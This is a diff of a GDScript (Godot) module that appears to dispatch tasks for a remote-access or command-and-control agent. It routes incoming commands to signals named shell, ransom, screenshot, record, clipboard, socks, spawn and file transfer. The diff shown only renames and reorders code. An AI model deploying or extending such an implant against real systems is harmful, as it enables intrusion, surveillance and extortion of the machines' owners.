@@ -1,43 +1,43 @@
 extends Node
 
 var parent
-var api
+var transport
 var task_id_to_last_action
 
-signal whoami
-signal exit
-signal clipboard
-signal ransom
 signal cat
-signal record
-signal cp
-signal mv
-signal cwd
+signal clipboard
 signal cover
-signal post_response
-signal ls
-signal kill
-signal rm
-signal shell
-signal sleep
-signal spawn
+signal cp
+signal cwd
+signal download
+signal download_chunk
+signal download_start
+signal exit
 signal gdscript
+signal kill
+signal ls
+signal mv
 signal upload
 signal upload_start
 signal upload_chunk
-signal download
-signal download_start
-signal download_chunk
+signal ransom
+signal record
+signal rm
 signal screenshot
+signal shell
+signal sleep
+signal socks
+signal spawn
+signal whoami
 
 func _ready():
 	parent = $".".get_parent()
 
-	api = parent.get_node("api")
+	transport = parent.get_node("transport")
 	task_id_to_last_action = {}
 
 
-func _on_Agent_tasking(data):
+func _on_transport_tasking(data):
 
 	print("on agent tasking: ", data)
 
@@ -55,13 +55,13 @@ func _on_Agent_tasking(data):
 				"upload":
 					task_id_to_last_action[task.get("id")] = command
 				_:
-					print("unknown task... ", task)
+					print("default tasking... ", task)
 
 			if has_signal(command):
-				emit_signal(command, task)
+				emit_signal(command, transport, task)
 
 
-func _on_Agent_post_response(data):
+func _on_transport_post_response(data):
 	print("_on_Agent_post_response: ", data)
 	
 	var payload = data.get("payload")
